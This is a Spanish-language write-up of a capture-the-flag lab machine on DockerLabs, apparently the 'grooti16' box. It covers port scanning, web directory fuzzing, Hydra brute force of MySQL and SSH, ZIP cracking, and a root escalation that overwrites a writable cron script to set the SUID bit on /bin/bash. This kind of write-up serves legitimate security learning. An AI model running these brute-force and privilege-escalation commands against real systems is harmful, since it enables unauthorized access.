
**Fecha:** **2026-07-13**
Plataforma:  **[DockerLabs](https://dockerlabs.es/)**
**IP objetivo:** 172.17.0.2
**Dificultad**: Fácil

**Descripción**: Enumeración de directorios web, bases de datos y escalada de privilegios en Linux.


![](images/Pasted%20image%2020260714182744.png)


----

## 1. Reconocimiento

El primer paso es identificar hosts activos en la red y luego enumerar sus puertos y servicios.

### 1.1 Escaneo de puertos (Nmap)

Antes de lanzar un escaneo detallado, hacemos un barrido rápido a todos los puertos para no perder ninguno abierto:

```bash
sudo nmap -sS --min-rate 5000 -n -Pn  172.17.0.2
```

```
Starting Nmap 7.95 ( https://nmap.org ) at 2026-07-13 15:35 -04
Nmap scan report for 172.17.0.2
Host is up (0.0000030s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql
MAC Address: 6A:62:25:B1:A6:43 (Unknown)
```

Encontramos tres puertos abiertos: **22 (SSH)**, **80 (HTTP)** y **3306 (MySQL)**. Esto nos da tres frentes de ataque a evaluar.

### 1.2 Escaneo de versiones y scripts

Con los puertos ya identificados, profundizamos con detección de versión (`-sV`) y scripts por defecto (`-sC`) para obtener más contexto de cada servicio:

```bash
nmap -p22,80,3306 -sCV 172.17.0.2
```

```
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 64 OpenSSH 9.6p1 Ubuntu 3ubuntu13.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 46:69:49:1a:d0:b7:26:05:90:a3:22:b2:a8:fe:fd:83 (ECDSA)
|_  256 91:67:c5:15:53:13:af:6f:28:7d:1e:77:46:0c:c1:bb (ED25519)
80/tcp   open  http    syn-ack ttl 64 Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: 🌱 Grooti's Web
| http-methods:
|_  Supported Methods: GET POST OPTIONS HEAD
3306/tcp open  mysql   syn-ack ttl 64 MySQL 8.0.42-0ubuntu0.24.04.2
| ssl-cert: Subject: commonName=MySQL_Server_8.0.42_Auto_Generated_Server_Certificate
| mysql-info:
|   Protocol: 10
|   Version: 8.0.42-0ubuntu0.24.04.2
|   Auth Plugin Name: caching_sha2_password
MAC Address: 6A:62:25:B1:A6:43 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### 1.3 Resumen de servicios

| Puerto   | Servicio | Versión                |
| -------- | -------- | ---------------------- |
| 22/tcp   | SSH      | OpenSSH 9.6p1 (Ubuntu) |
| 80/tcp   | HTTP     | Apache 2.4.58 (Ubuntu) |
| 3306/tcp | MySQL    | MySQL 8.0.42           |

Al ser MySQL 8 con `caching_sha2_password`, no es un servicio trivial de atacar por fuerza bruta sin credenciales previas, así que priorizamos primero la enumeración web (puerto 80), que suele filtrar información útil (usuarios, rutas, credenciales) antes de intentar acceder a la base de datos o a SSH.

### 1.4 Fingerprint web (WhatWeb)

Para confirmar tecnologías del lado web antes de fuzzear:

```bash
whatweb 172.17.0.2
```

```
http://172.17.0.2 [200 OK] Apache[2.4.58], Country[RESERVED][ZZ], HTML5,
HTTPServer[Ubuntu Linux][Apache/2.4.58 (Ubuntu)], IP[172.17.0.2], Title[🌱 Grooti's Web]
```

Confirma Apache 2.4.58 sobre Ubuntu, sin indicios de un framework adicional (WordPress, Laravel, etc.), por lo que probablemente el sitio está hecho en PHP plano.

---

## 2. Enumeración web — Puerto 80

### 2.1 Fuzzing de directorios

Lanzamos Gobuster para descubrir rutas y archivos ocultos que no aparecen enlazados en la página principal:

```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x js,json,html,php
```

```
/.php                 (Status: 403) [Size: 274]
/archives             (Status: 301) [Size: 309] [--> http://172.17.0.2/archives/]
/.html                (Status: 403) [Size: 274]
/index.html           (Status: 200) [Size: 1436]
/imagenes             (Status: 301) [Size: 309] [--> http://172.17.0.2/imagenes/]
/secret               (Status: 301) [Size: 307] [--> http://172.17.0.2/secret/]
/server-status        (Status: 403) [Size: 274]
```

De estas rutas, `/secret/` e `/imagenes/` llaman especialmente la atención por sus nombres, así que las revisamos primero.

### 2.2 Página principal

Al revisar `index.php` en el navegador, vemos que el sitio expone un menú con varias secciones. Se puede acceder libremente a casi todas, excepto a la sección "Mi base de datos", que probablemente requiere autenticación o credenciales que aún no tenemos.

![Index|498](./images/Pasted%20image%2020260713165301.png)

### 2.3 Directorio `/secret/`

Dentro de `/secret/` encontramos una lista con nombres de usuario potenciales del sistema:

- `grooti`
- `rocket`
- `Naia`

![Secret](./images/Pasted%20image%2020260713154939.png)

Esta lista es valiosa porque nos da un punto de partida para ataques de fuerza bruta más adelante (SSH y MySQL), en lugar de tener que adivinar usuarios.

Además, en esa misma ruta hay un archivo descargable que, al abrirlo, resulta ser un `.txt` con el siguiente contenido:

```bash
mysql -u rocket -p -h 172.17.0.2 --ssl=0
```

Esto confirma dos cosas: que el usuario `rocket` existe y tiene acceso a MySQL, y que la conexión debe hacerse sin SSL (`--ssl=0`), algo importante porque MySQL 8 puede rechazar conexiones sin este flag en ciertas configuraciones.

### 2.4 Directorio `/imagenes/`

Repetimos el mismo proceso en `/imagenes/`:

![Imagenes|389](./images/Pasted%20image%2020260713155409.png)

Aquí encontramos un archivo `README.txt` con la siguiente pista, que interpretamos como una contraseña a usar más adelante, aunque todavía no sabemos con qué usuario o servicio:

```
(password1) Encuentra donde ponerla ;)
```

Guardamos este dato (`password1`) para usarlo más adelante en los ataques de fuerza bruta.

---

## 3. Acceso a MySQL — Puerto 3306

Con el usuario `rocket` (obtenido en `/secret/`) y la contraseña `password1` (obtenida en `/imagenes/`), tenemos ya material suficiente para intentar acceso directo a la base de datos, en lugar de seguir fuzzeando a ciegas.

### 3.1 Fuerza bruta (confirmación de credenciales)

Para no depender de un único intento manual, guardamos los usuarios encontrados (`grooti`, `rocket`, `Naia`) en un archivo `users.txt` y probamos la contraseña obtenida contra todos ellos usando Hydra:

```bash
hydra -L users.txt -p 'password1' 172.17.0.2 mysql
```

```
[3306][mysql] host: 172.17.0.2   login: rocket   password: password1
```

Esto confirma que la combinación correcta es `rocket:password1`, coincidiendo con lo que ya intuíamos por las pistas web.

### 3.2 Acceso a la base de datos

```bash
mysql -u rocket -p'password1' -h 172.17.0.2 --ssl=0
```

![MySQL access|317](./images/Pasted%20image%2020260713160914.png)

Una vez dentro, listamos las bases de datos disponibles. Existe una llamada `files_secret`, pero el usuario `rocket` no tiene permisos suficientes para leer su contenido. Como alternativa, recurrimos a `information_schema`, una base de datos de metadatos a la que casi cualquier usuario autenticado tiene acceso de lectura, y que nos permite ver la estructura de tablas de todo el servidor sin necesidad de permisos directos sobre `files_secret`:

```sql
SELECT table_schema, table_name FROM information_schema.tables;
```

![Information schema](./images/Pasted%20image%2020260713161026.png)

Al revisar el contenido de la tabla relevante encontrada en ese listado:

![Table content](./images/Pasted%20image%2020260713161138.png)

Dentro de esa tabla se listan rutas del sitio web, y entre ellas aparece una ruta que **no fue detectada por Gobuster**: `/unprivate/secret`. Esto es clave, porque nos permite avanzar más allá de lo que el fuzzing tradicional pudo encontrar.

---

## 4. Ruta oculta `/unprivate/secret`

Visitamos la ruta descubierta a través de MySQL:

```
http://172.17.0.2/unprivate/secret
```

![Unprivate secret](./images/Pasted%20image%2020260713161741.png)

Con `Ctrl+U` revisamos el código fuente de la página y encontramos lo siguiente:

```html
</head>
<body>
  <div class="terminal">
    <h1>🛸 Grooti Terminal Access</h1>
    <p>Acceso restringido al sistema de logs de la nave</p>
    <form action="generate.php" method="POST">
      <input type="text" name="content" placeholder="Mensaje de acceso..." required><br>
      <input type="number" name="number" placeholder="Número entre 1 y 100" min="1" max="100" required><br>
      <button type="submit">Transmitir a Groot</button>
    </form>
    <div class="groot-console">Registro automático de cada entrada. Límites aplicados.</div>
    <div class="ascii">
<pre>
```

Este formulario envía un `POST` a `generate.php`, un script PHP que recibe un texto (`content`) y un número entre 1 y 100 (`number`). Al ser un endpoint PHP que procesa entrada de usuario y "genera" algo en el servidor, es un buen candidato para explorar por posibles vulnerabilidades de subida de archivos, inyección de comandos, o generación de contenido descargable.

### 4.1 Explotación del formulario

Probando distintos valores en el campo `number`, notamos que el nombre del reto es "grooti**16**", lo cual sugiere que el número 16 tiene un significado especial dentro de la lógica del script. Al enviar `number=16`, el formulario responde generando y ofreciendo la descarga de un archivo `.zip`.

### 4.2 Fuerza bruta al ZIP

El `.zip` descargado está protegido con contraseña. Realizamos fuerza bruta con `fcrackzip` o `zip2john` + `john`:

![Zip cracking](./images/Pasted%20image%2020260713165634.png)

La contraseña resultante coincide exactamente con la pista `password1` que ya habíamos encontrado en el `README.txt` de `/imagenes/`, confirmando que todas las pistas del reto están conectadas entre sí.

Al descomprimir el archivo, obtenemos una lista de posibles contraseñas (una wordlist personalizada):

![Wordlist|225](./images/Pasted%20image%2020260713165923.png)

### 4.3 Fuerza bruta a SSH

Con esta wordlist personalizada, atacamos el servicio SSH usando los usuarios ya conocidos (`grooti`, `rocket`, `Naia`):

![SSH bruteforce|519](./images/Pasted%20image%2020260713170249.png)

El ataque tiene éxito y obtenemos credenciales SSH válidas.

---

## 5. Puerto 22 — Acceso SSH

Con las credenciales obtenidas en el paso anterior, accedemos por SSH:

```bash
ssh grooti@172.17.0.2
# Password: YoSoYgRoOt
```

Con esto obtenemos una shell interactiva como el usuario `grooti` en el sistema.

---

## 6. Post-explotación — Enumeración del sistema

Ya dentro del sistema como `grooti`, hacemos enumeración local en busca de vectores de escalada de privilegios.

### 6.1 Enumeración básica

```bash
ls -la /opt

drwxr-xr-x 1 root root 20 Jul 22  2025 .
drwxr-xr-x 1 root root 18 Jul 13 23:53 ..
-rwxr-xr-- 1 root root 36 Jul 22  2025 cleanup.sh
```

```bash
ls -la /tmp

drwxrwxrwt 1 root  root     0 Jul 14 00:07 .
drwxr-xr-x 1 root  root    18 Jul 13 23:53 ..
-rwxrw-r-- 1 root  grooti 221 Jul 22  2025 malicious.sh
drwx------ 1 mysql mysql    0 Jul 19  2025 tmp.ngOCkV7Loy
```

El archivo `malicious.sh` en `/tmp` llama la atención de inmediato: pertenece a `root` pero el grupo `grooti` tiene permiso de escritura (`rw-` en el grupo). Esto es una señal fuerte de que algún proceso privilegiado (probablemente una tarea cron ejecutada por `root`) lo ejecuta periódicamente, y nosotros podemos modificarlo.

### 6.2 Permisos sudo

Verificamos si `grooti` tiene permisos sudo configurados:

```bash
sudo -l
```

```
Sorry, user grooti may not run sudo on c05044af2667.
```

Sin acceso a sudo, descartamos esta vía.

### 6.3 Binarios SUID

Buscamos binarios con el bit SUID activado que puedan ser abusados (vía [GTFOBins](https://gtfobins.github.io/)):

```bash
find / -perm -4000 -type f 2>/dev/null
```

No se encuentran binarios SUID explotables directamente, por lo que nos enfocamos en la pista más prometedora: `malicious.sh`.

### 6.4 Escalada de privilegios vía script con permisos de escritura

Dado que `malicious.sh` es escribible por nuestro grupo y presumiblemente se ejecuta por una tarea cron con privilegios de `root`, sobrescribimos su contenido para que, al ejecutarse, asigne el bit SUID a `/bin/bash`:

```bash
echo -e '#!/bin/bash\nchmod +s /bin/bash' > /tmp/malicious.sh
```

Esperamos a que la tarea cron ejecute el script (o forzamos su ejecución si tenemos control sobre el trigger). Una vez ejecutado por `root`, `/bin/bash` queda con el bit SUID activo, lo que nos permite obtener una shell con privilegios elevados:

```bash
/bin/bash -p
whoami
```

Con esto logramos escalar privilegios en el sistema hasta `root`.

---

## 7. Resumen del ataque

1. **Reconocimiento:** identificación del host `172.17.0.2` y sus puertos abiertos (22, 80, 3306) con Nmap.
2. **Enumeración web:** fuzzing con Gobuster; descubrimiento de `/secret/` (usuarios del sistema) y `/imagenes/` (pista de contraseña `password1`).
3. **Acceso a MySQL:** con el usuario `rocket` y la contraseña `password1`, se confirma el acceso vía Hydra y se enumera `information_schema` (al no tener permisos sobre `files_secret`), revelando la ruta oculta `/unprivate/secret` no detectada por el fuzzing web.
4. **Explotación de formulario PHP:** en `/unprivate/secret`, el endpoint `generate.php` genera un `.zip` protegido al enviar `number=16`; se rompe con fuerza bruta usando la misma contraseña `password1`, revelando una wordlist personalizada.
5. **Fuerza bruta a SSH:** con la wordlist obtenida se logra acceso SSH como `grooti`.
6. **Post-explotación:** se identifica `malicious.sh`, un script en `/tmp` propiedad de `root` pero escribible por el grupo `grooti`, ejecutado presumiblemente por cron.
7. **Escalada de privilegios:** se sobrescribe el script para asignar el bit SUID a `/bin/bash`, obteniendo una shell privilegiada como `root`.

---

